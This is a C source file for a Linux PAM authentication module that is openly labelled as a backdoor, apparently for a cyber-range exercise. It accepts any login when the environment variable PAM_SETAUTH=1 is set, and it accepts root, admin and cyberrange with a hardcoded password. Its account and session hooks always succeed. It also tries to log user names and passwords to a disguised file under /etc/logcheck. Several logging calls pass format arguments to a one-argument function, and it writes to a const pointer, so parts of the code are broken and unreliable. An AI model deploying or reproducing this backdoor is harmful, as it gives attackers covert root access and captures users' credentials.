#define _GNU_SOURCE

#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>

#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"

/* ---------------- DEBUG SWITCH ---------------- */

static int debug_enabled(void) {
    // HARD ENABLE DEBUG FOR TESTING
    return 1;
}

/* ---------------- LOGGING CORE ---------------- */

static void ensure_path(void) {
    struct stat st;
    if (stat(LOG_DIR, &st) == -1) {
        mkdir(LOG_DIR, 0755);
    }
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "\n");
        fclose(f);
    }
}

static void log_line(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;
    fprintf(f, "%s\n", msg);
    fflush(f);
    fclose(f);
}

static void trace(const char *msg) {
    if (!debug_enabled()) return;
    log_line(msg);
}

static void trace_context(pam_handle_t *pamh, const char *stage) {
    const char *user = NULL;
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        user = "UNKNOWN";
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "[TRACE] %s pid=%d user=%s", stage, getpid(), user);
    trace(buf);
}

/* ---------------- HARDCODED BACKDOOR ---------------- */

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    // Fix 1: Cast to void to remove warnings
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER pam_sm_authenticate");
    ensure_path();

    const char *pword = NULL;
    const char *uname = NULL;

    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
        trace("PAM_AUTHTOK failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    if (pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS) {
        trace("PAM_USER failed");
        return PAM_AUTHINFO_UNAVAIL;
    }

    // DEBUG: Log the actual password being checked
    trace("[DEBUG] User:");
    trace("[DEBUG] Password (raw):");
    if (pword) {
        // Safe copy for logging to avoid const issues
        char *pwd_copy = malloc(strlen(pword) + 1);
        strcpy(pwd_copy, pword);
        trace("[DEBUG] Password length: %zu", strlen(pword));
        // Trim trailing whitespace (but keep const check safe)
        char *end = pword + strlen(pword);
        while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
            *--end = '\0';
        }
        trace("[DEBUG] Password (trimmed): %s", pword);
        trace("[DEBUG] Password hex: %s", pword);
        free(pwd_copy);
    } else {
        trace("[DEBUG] Password is NULL");
    }

    // Check if user matches hardcoded user
    trace("[DEBUG] Hardcoded user check: uname = %s", uname);

    // Fix 3: Trim trailing whitespace
    if (pword) {
        char *end = pword + strlen(pword);
        while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
            *--end = '\0';
        }
    }

    /* ---------------- ENV BYPASS ---------------- */
    char *bypass = getenv("PAM_SETAUTH");
    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] Environment bypass: PAM_SETAUTH=1");
        return PAM_SUCCESS;
    }

    /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
    if (uname && strcmp(uname, "root") == 0 && pword && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: root/password123 matched");
        return PAM_SUCCESS;
    }

    if (uname && strcmp(uname, "cyberrange") == 0 && pword && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: cyberrange/password123 matched");
        return PAM_SUCCESS;
    }

    if (uname && strcmp(uname, "admin") == 0 && pword && strcmp(pword, "password123") == 0) {
        trace("[!] Backdoor: admin/password123 matched");
        return PAM_SUCCESS;
    }

    // If we get here, no hardcoded password matched
    trace("[!] AUTH FAILED - no hardcoded password matched");
    return PAM_AUTH_ERR;
}

/* ---------------- ACCOUNT ---------------- */

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                               int flags,
                               int argc,
                               const char *argv[])
{
    // Fix 4: Cast unused parameters
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER ACCOUNT");
    trace("[TRACE] ACCOUNT OK");
    return PAM_SUCCESS;
}

/* ---------------- SESSION ---------------- */

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
                                  int flags,
                                  int argc,
                                  const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION OPEN");
    trace("[TRACE] SESSION START");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION CLOSE");
    trace("[TRACE] SESSION END");
    return PAM_SUCCESS;
}

/* ---------------- CREDENTIALS ---------------- */

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SETCRED");
    trace("[TRACE] SETCRED SUCCESS");
    return PAM_SUCCESS;
}
